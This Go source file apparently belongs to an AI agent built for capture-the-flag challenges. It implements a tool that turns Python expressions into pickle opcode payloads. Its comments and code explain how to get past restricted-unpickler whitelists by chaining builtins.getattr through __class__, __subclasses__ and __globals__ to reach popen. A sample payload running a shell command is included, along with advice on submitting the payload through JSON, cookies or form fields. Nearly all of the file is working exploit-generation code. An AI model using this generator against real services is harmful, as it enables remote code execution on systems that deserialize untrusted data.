package kernel

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"

	"ctfagent/internal/llm"
)

// ---------------------------------------------------------------------------
// pickle：把一条「Python 表达式」翻译成 pickle opcode 流
//
// 为什么需要它：反序列化题的沙箱常常是一个「只白名单几个无害函数」的
// RestrictedUnpickler（例如只放行 builtins.getattr / builtins.type）。
// 这时候 os.system 直接被拒，但 getattr 是放行的 —— 只要有 getattr，
// 就能拼出任意属性访问：
//
//	getattr( (), '__class__' ) → getattr(that,'__base__') → ... → __globals__['popen']
//
// 手写这套 opcode（c...\n...\n + ( ... t R）非常容易错一个字节就整条废掉，
// 而且每改一次 payload 就要重编一遍。交给工具，模型只需写普通 Python 表达式。
// ---------------------------------------------------------------------------

// doPickle 解析表达式并输出 pickle 字节（默认 base64）。
func (t *ToolSet) doPickle(tc llm.ToolCall) string {
	var a struct {
		Expr     string `json:"expr"`
		Encoding string `json:"encoding"` // base64（默认）/ hex / raw
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	if strings.TrimSpace(a.Expr) == "" {
		return "需要 expr，例如：().__class__.__base__.__subclasses__()[0].__init__.__globals__['popen']('id').read()"
	}
	node, err := parsePyExpr(a.Expr)
	if err != nil {
		return "表达式解析失败: " + err.Error()
	}
	g := &pkGen{}
	if err := g.emit(node); err != nil {
		return "生成失败: " + err.Error()
	}
	g.b.WriteString(".")
	raw := g.b.Bytes()

	var encoded, how string
	switch strings.ToLower(a.Encoding) {
	case "hex":
		encoded, how = hexEncode(raw), "hex"
	case "raw":
		encoded, how = string(raw), "raw"
	default:
		encoded, how = base64.StdEncoding.EncodeToString(raw), "base64"
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "pickle 载荷（%s，%d 字节原文）：\n%s\n", how, len(raw), encoded)
	fmt.Fprintf(&sb, "opcode 预览：%s\n", g.preview())
	fmt.Fprintf(&sb, "用到的 GLOBAL：%s\n", strings.Join(g.globals, ", "))
	sb.WriteString("提交方式取决于题目：POST JSON {\"data\": \"<base64>\"}，或直接作为 cookie/表单字段。")
	return sb.String()
}

// hexEncode 供 pickle/其他工具共用（避免各自 import）。
func hexEncode(b []byte) string {
	const hexdigits = "0123456789abcdef"
	out := make([]byte, 0, len(b)*2)
	for _, c := range b {
		out = append(out, hexdigits[c>>4], hexdigits[c&0xf])
	}
	return string(out)
}

// pkGen 负责把语法树写成 pickle 协议 0 的字节流。
// 统一用 protocol 0 的文本 opcode：兼容性最好（Python 2/3 都能读）。
type pkGen struct {
	b       bytes.Buffer
	globals []string
	ops     []string
}

func (g *pkGen) emit(n *pyNode) error {
	switch n.kind {
	case "none":
		g.b.WriteString("N")
		g.ops = append(g.ops, "N(None)")
	case "bool":
		if n.num != 0 {
			g.b.WriteString("I01\n")
		} else {
			g.b.WriteString("I00\n")
		}
	case "int":
		fmt.Fprintf(&g.b, "I%d\n", n.num)
		g.ops = append(g.ops, "I(int)")
	case "str":
		g.b.WriteString("S" + pyRepr(n.str) + "\n")
		g.ops = append(g.ops, "S("+shorten(n.str, 20)+")")
	case "name":
		// 点号分开：最后一段是属性名，前面是模块
		parts := strings.Split(n.str, ".")
		mod := parts[0]
		name := strings.Join(parts[1:], ".")
		if len(parts) == 1 {
			// 单段名字当成模块里的同名属性（如 getattr → builtins.getattr）
			mod, name = "builtins", parts[0]
		}
		fmt.Fprintf(&g.b, "c%s\n%s\n", mod, name)
		g.globals = append(g.globals, mod+"."+name)
		g.ops = append(g.ops, "GLOBAL "+mod+"."+name)
	case "tuple", "list":
		if len(n.kids) == 0 {
			if n.kind == "list" {
				g.b.WriteString("]")
				g.ops = append(g.ops, "EMPTY_LIST")
				return nil
			}
			g.b.WriteString(")")
			g.ops = append(g.ops, "EMPTY_TUPLE")
			return nil
		}
		g.b.WriteString("(")
		for _, k := range n.kids {
			if err := g.emit(k); err != nil {
				return err
			}
		}
		if n.kind == "list" {
			g.b.WriteString("l")
			g.ops = append(g.ops, "LIST")
		} else {
			g.b.WriteString("t")
			g.ops = append(g.ops, "TUPLE")
		}
	case "call":
		if len(n.kids) == 0 {
			return fmt.Errorf("call 节点缺少被调用者")
		}
		if err := g.emit(n.kids[0]); err != nil {
			return err
		}
		args := n.kids[1:]
		if len(args) == 0 {
			g.b.WriteString(")")
		} else {
			g.b.WriteString("(")
			for _, k := range args {
				if err := g.emit(k); err != nil {
					return err
				}
			}
			g.b.WriteString("t")
		}
		g.b.WriteString("R")
		g.ops = append(g.ops, "REDUCE(调用)")
	case "attr":
		// getattr(obj, 'name')
		if err := g.emitGetattr(n.kids[0], &pyNode{kind: "str", str: n.str}); err != nil {
			return err
		}
		g.ops = append(g.ops, ".attr "+n.str)
	case "item":
		// getattr(obj, '__getitem__')(index)
		bound := &pyNode{kind: "call", kids: []*pyNode{
			{kind: "attr", str: "__getitem__", kids: []*pyNode{n.kids[0]}},
			n.kids[1],
		}}
		if err := g.emit(bound); err != nil {
			return err
		}
		g.ops = append(g.ops, "[下标]")
	default:
		return fmt.Errorf("不支持的节点类型 %q", n.kind)
	}
	return nil
}

// emitGetattr 发出 builtins.getattr(obj, name) 的 opcode。
func (g *pkGen) emitGetattr(obj *pyNode, name *pyNode) error {
	fmt.Fprintf(&g.b, "cbuiltins\ngetattr\n")
	g.globals = append(g.globals, "builtins.getattr")
	g.b.WriteString("(")
	if err := g.emit(obj); err != nil {
		return err
	}
	if err := g.emit(name); err != nil {
		return err
	}
	g.b.WriteString("tR")
	return nil
}

func (g *pkGen) preview() string {
	if len(g.ops) > 24 {
		return strings.Join(g.ops[:24], " · ") + fmt.Sprintf(" …（共 %d 步）", len(g.ops))
	}
	return strings.Join(g.ops, " · ")
}

func shorten(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// pyRepr 生成 Python 单行字符串字面量（比 Go 的 %q 更接近 repr）。
func pyRepr(s string) string {
	var b strings.Builder
	b.WriteByte('\'')
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString(`\\`)
		case '\'':
			b.WriteString(`\'`)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			b.WriteRune(r)
		}
	}
	b.WriteByte('\'')
	return b.String()
}

// ---------------------------------------------------------------------------
// 表达式解析：只支持「RCE 链」需要的方言，够用且不容易歧义
//
//	字面量   ()  (a, b)  [a, b]  'text'  141  None  True  False
//	名字     builtins.getattr  os.system
//	后缀     .attr   [expr]   (args...)
// ---------------------------------------------------------------------------

type pyNode struct {
	kind string // none/bool/int/str/name/tuple/list/call/attr/item
	str  string
	num  int64
	kids []*pyNode
}

type pyParser struct {
	s   []rune
	pos int
}

func parsePyExpr(src string) (*pyNode, error) {
	p := &pyParser{s: []rune(src)}
	n, err := p.parsePostfix()
	if err != nil {
		return nil, err
	}
	p.skipSpace()
	if p.pos < len(p.s) {
		return nil, fmt.Errorf("第 %d 个字符起多余: %q", p.pos, string(p.s[p.pos:]))
	}
	return n, nil
}

func (p *pyParser) skipSpace() {
	for p.pos < len(p.s) && (p.s[p.pos] == ' ' || p.s[p.pos] == '\t' || p.s[p.pos] == '\n' || p.s[p.pos] == '\r') {
		p.pos++
	}
}

func (p *pyParser) peek() rune {
	p.skipSpace()
	if p.pos >= len(p.s) {
		return 0
	}
	return p.s[p.pos]
}

func (p *pyParser) parsePostfix() (*pyNode, error) {
	n, err := p.parseAtom()
	if err != nil {
		return nil, err
	}
	for {
		switch p.peek() {
		case '.':
			p.pos++
			name := p.readIdent()
			if name == "" {
				return nil, fmt.Errorf("`.` 后缺少属性名")
			}
			n = &pyNode{kind: "attr", str: name, kids: []*pyNode{n}}
		case '[':
			p.pos++
			idx, err := p.parsePostfix()
			if err != nil {
				return nil, err
			}
			if p.peek() != ']' {
				return nil, fmt.Errorf("缺少 `]`")
			}
			p.pos++
			n = &pyNode{kind: "item", kids: []*pyNode{n, idx}}
		case '(':
			p.pos++
			var args []*pyNode
			for {
				if p.peek() == ')' {
					p.pos++
					break
				}
				a, err := p.parsePostfix()
				if err != nil {
					return nil, err
				}
				args = append(args, a)
				switch p.peek() {
				case ',':
					p.pos++
				case ')':
					p.pos++
					goto done
				default:
					return nil, fmt.Errorf("参数之间缺少 `,` 或 `)`")
				}
			}
		done:
			n = &pyNode{kind: "call", kids: append([]*pyNode{n}, args...)}
		default:
			return n, nil
		}
	}
}

func (p *pyParser) readIdent() string {
	start := p.pos
	for p.pos < len(p.s) {
		c := p.s[p.pos]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_' {
			p.pos++
			continue
		}
		break
	}
	return string(p.s[start:p.pos])
}

func (p *pyParser) parseAtom() (*pyNode, error) {
	c := p.peek()
	switch {
	case c == '(':
		p.pos++
		if p.peek() == ')' {
			p.pos++
			return &pyNode{kind: "tuple"}, nil
		}
		var kids []*pyNode
		for {
			k, err := p.parsePostfix()
			if err != nil {
				return nil, err
			}
			kids = append(kids, k)
			switch p.peek() {
			case ',':
				p.pos++
				if p.peek() == ')' { // 尾逗号
					p.pos++
					return &pyNode{kind: "tuple", kids: kids}, nil
				}
			case ')':
				p.pos++
				if len(kids) == 1 {
					return kids[0], nil // 括号只是分组
				}
				return &pyNode{kind: "tuple", kids: kids}, nil
			default:
				return nil, fmt.Errorf("括号内缺少 `,` 或 `)`")
			}
		}
	case c == '[':
		p.pos++
		var kids []*pyNode
		for {
			if p.peek() == ']' {
				p.pos++
				return &pyNode{kind: "list", kids: kids}, nil
			}
			k, err := p.parsePostfix()
			if err != nil {
				return nil, err
			}
			kids = append(kids, k)
			switch p.peek() {
			case ',':
				p.pos++
			case ']':
				p.pos++
				return &pyNode{kind: "list", kids: kids}, nil
			default:
				return nil, fmt.Errorf("列表内缺少 `,` 或 `]`")
			}
		}
	case c == '\'' || c == '"':
		quote := c
		p.pos++
		var b strings.Builder
		for p.pos < len(p.s) && p.s[p.pos] != quote {
			if p.s[p.pos] == '\\' && p.pos+1 < len(p.s) {
				p.pos++
				switch p.s[p.pos] {
				case 'n':
					b.WriteByte('\n')
				case 't':
					b.WriteByte('\t')
				case 'r':
					b.WriteByte('\r')
				default:
					b.WriteRune(p.s[p.pos])
				}
				p.pos++
				continue
			}
			b.WriteRune(p.s[p.pos])
			p.pos++
		}
		if p.pos >= len(p.s) {
			return nil, fmt.Errorf("字符串没有闭合")
		}
		p.pos++
		return &pyNode{kind: "str", str: b.String()}, nil
	case c >= '0' && c <= '9':
		return p.parseNumber()
	case isIdentStart(c):
		id := p.readIdent()
		// 开头的名字允许点号连写（builtins.getattr / os.system），
		// 但表达式之后的 `.xxx` 属于后缀访问，由 parsePostfix 处理。
		for p.pos < len(p.s) && p.s[p.pos] == '.' && p.pos+1 < len(p.s) && isIdentStart(p.s[p.pos+1]) {
			p.pos++
			id += "." + p.readIdent()
		}
		switch id {
		case "None":
			return &pyNode{kind: "none"}, nil
		case "True":
			return &pyNode{kind: "bool", num: 1}, nil
		case "False":
			return &pyNode{kind: "bool", num: 0}, nil
		}
		return &pyNode{kind: "name", str: id}, nil
	}
	return nil, fmt.Errorf("无法识别的字符 %q", string(c))
}

func (p *pyParser) parseNumber() (*pyNode, error) {
	start := p.pos
	for p.pos < len(p.s) && p.s[p.pos] >= '0' && p.s[p.pos] <= '9' {
		p.pos++
	}
	v, err := strconv.ParseInt(string(p.s[start:p.pos]), 10, 64)
	if err != nil {
		return nil, fmt.Errorf("数字解析失败: %w", err)
	}
	return &pyNode{kind: "int", num: v}, nil
}

func isIdentStart(c rune) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c == '_'
}
